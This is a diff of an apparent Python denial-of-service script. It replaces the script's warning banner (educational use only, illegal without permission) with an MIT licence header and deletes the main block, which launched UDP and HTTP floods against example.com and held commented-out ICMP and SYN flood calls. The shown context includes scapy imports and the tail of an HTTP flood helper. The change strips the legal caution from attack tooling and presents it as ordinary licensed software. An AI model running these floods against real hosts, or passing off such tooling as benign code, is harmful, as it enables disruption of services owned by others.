@@ -1,9 +1,24 @@
-# ==============================================================================
-# WARNING: This is a Denial of Service (DoS) script for educational purposes.
-# Running this code against any server or network without explicit, written
-# permission from the owner is illegal in most countries and can result in
-# severe legal consequences. Use only in a controlled lab environment.
-# ==============================================================================
+""""MIT License
+
+Copyright (c) [2025] [Scott Wang]
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE."""
 
 from urllib.parse import urlparse
 from scapy.all import *
@@ -334,36 +349,3 @@ def attack_http_flood_helper(ip, port, host_header):
         # Gracefully close the socket connection.
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
-
-
-# --- 5. MAIN EXECUTION BLOCK ---
-
-def main():
-    """Main function to demonstrate the attacks."""
-    print("=====================================================")
-    print("=             DoS Attack Script Demo                =")
-    print("=====================================================")
-
-    # --- Configuration ---
-    target_host = "example.com"  # !!! IMPORTANT: ONLY use a host you have permission to test !!!
-    target_port_http = 80
-    target_port_udp = 53  # A common UDP port (DNS)
-    attack_duration_seconds = 5
-    num_http_requests = 500
-    num_scapy_packets = 200
-    num_udp_threads = 150
-
-    # --- Running the Attacks ---
-    attack_UDP("UDP-Flood", target_host, target_port_udp, attack_duration_seconds, num_udp_threads)
-
-    attack_http_flood(target_host, target_port_http, num_http_requests)
-
-    # Note: The following attacks require root/administrator privileges to create raw sockets.
-    # icmpflood(target_host, num_scapy_packets)
-    # synflood(target_host, target_port_http, num_scapy_packets)
-
-    print("\n--- All attacks complete. ---")
-
-
-if __name__ == "__main__":
-    main()
